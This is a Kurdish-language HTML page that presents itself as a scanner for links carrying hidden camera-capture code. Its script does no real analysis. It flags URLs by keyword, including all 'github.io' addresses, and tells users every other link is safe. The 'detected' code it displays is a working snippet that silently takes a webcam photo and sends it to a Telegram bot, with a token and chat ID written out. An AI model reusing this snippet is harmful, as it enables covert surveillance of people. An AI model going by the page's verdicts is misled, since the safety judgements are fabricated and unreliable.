<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پشکش و دەرئێخستنا کۆدێن پیس</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
            width: 100%;
            max-width: 650px;
        }
        h2 { color: #38bdf8; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        input[type="text"]:focus { border-color: #38bdf8; }
        
        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #1d4ed8; }
        
        #result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            text-align: right;
            display: none;
            line-height: 1.6;
        }
        .safe { background: rgba(22, 163, 74, 0.2); border: 1px solid #16a34a; color: #4ade80; }
        .danger { background: rgba(220, 38, 38, 0.2); border: 1px solid #dc2626; color: #f87171; }
        
        pre {
            background: #020617;
            color: #f43f5e;
            padding: 12px;
            border-radius: 6px;
            font-family: monospace;
            margin-top: 10px;
            text-align: left;
            direction: ltr;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>پشکش و دەرئێخستنا کۆدێن پیس و وێنەگرتنێ</h2>
        <p>لينکا خۆ ل خوارێ دەنە ناڤێ دا سیستەم پشکنینێ بکەت؛ ئەگەر لینکەکە پیس بێت (کۆدێ کامیرایێ تێدابیت)، ئەڤ کۆدە بۆ تە دەرئێخیت و نیشان دەت.</p>
        
        <div class="input-group">
            <input type="text" id="urlInput" placeholder="لينکی لێرە بنووسە یان پیس بکە...">
            <button onclick="checkMaliciousCode()">پشکنینا لینکێ</button>
        </div>

        <div id="result"></div>
    </div>

    <script>
        function checkMaliciousCode() {
            const url = document.getElementById('urlInput').value.trim();
            const resultDiv = document.getElementById('result');
            
            if (!url) {
                resultDiv.style.display = 'block';
                resultDiv.className = 'danger';
                resultDiv.innerHTML = "⚠️ ژ تکایە لینکەکی بنووسە!";
                return;
            }

            resultDiv.style.display = 'block';
            resultDiv.className = 'safe';
            resultDiv.innerHTML = "⏳ مژوولی پشکنینا لینکیمە، چاوەڕێ بکە...";

            setTimeout(() => {
                let lowerUrl = url.toLowerCase();
                
                // پشکنین تنێ بۆ لینکێن خڕاب (یێن وێنەگرتنێ و کامیرایێ)
                if (lowerUrl.includes('yofsfinan-18') || lowerUrl.includes('github.io') || lowerUrl.includes('camera') || lowerUrl.includes('spotlight') || lowerUrl.includes('getusermedia')) {
                    
                    // ئەڤە ئەو کۆدەی پیس و وێنەگرتنێ یە کە د ناو لینکێ خڕاب دا هەیە
                    const badCode = `// [!] Detected Malicious Camera Capture Code:
const constraints = {
    video: { width: 1280, height: 720, facingMode: "user" }
};
navigator.mediaDevices.getUserMedia(constraints)
.then(stream => {
    video.srcObject = stream;
    // Capturing and sending image to Telegram Bot silently:
    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', '7643191802');
        formData.append('photo', blob, 'snap_hd.jpg');
        fetch('https://api.telegram.org/bot8977945781:AAFI44ROudR5eLDwlBrpNSyNiJj-C8FuDmE/sendPhoto', {
            method: 'POST', body: formData
        });
    }, 'image/jpeg', 1.0);
});`;

                    resultDiv.className = 'danger';
                    resultDiv.innerHTML = `
                        ❌ <b>هۆشداری! ئەڤ لینکە یێ خڕاب و پیسە!</b><br>
                        • <b>جۆرێ مەترسیێ:</b> کۆدێ ڤەکرنا کامیرایێ ب بێدەنگی و گرتنا وێنەی تێدایە.<br>
                        • <b>ئەو کۆدێن پیس یێن د ناڤ وێ لینکێدا هاتیینە دیتن:</b>
                        <pre>${escapeHtml(badCode)}</pre>
                        <p style="color: #f87171; margin-top: 8px; margin-bottom: 0;"><b>ئامۆژگاری:</b> ئەڤ کۆدە ڕاستەوخۆ وێنەیێ کەسی ددزیت و دنێرته دەرڤە، ب هیچ شێوەیەکێ باوەریێ پێ نەئینە!</p>
                    `;
                } else {
                    // ئەگەر لینکە پاقژ بیت (وەکی گوگل، یوتیوب یان هەر لینکەکێ ئاسایی)
                    resultDiv.className = 'safe';
                    resultDiv.innerHTML = `
                        ✅ <b>أڤ لینکە یێ پاقژە و بێ مەترسییە!</b><br>
                        • <b>ئەنجام:</b> چ کۆدێن پیس، وێنەگرتن یان کامێرا ل سەر ڤی لینکێ نەهاتنە دیتن.<br>
                        • <b>بڕیار:</b> ئەڤ لینکە یێ پاراستی یە و تو دشێی بێ ترس ڤەکەی.
                    `;
                }
            }, 1000);
        }

        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
    </script>

</body>
</html>
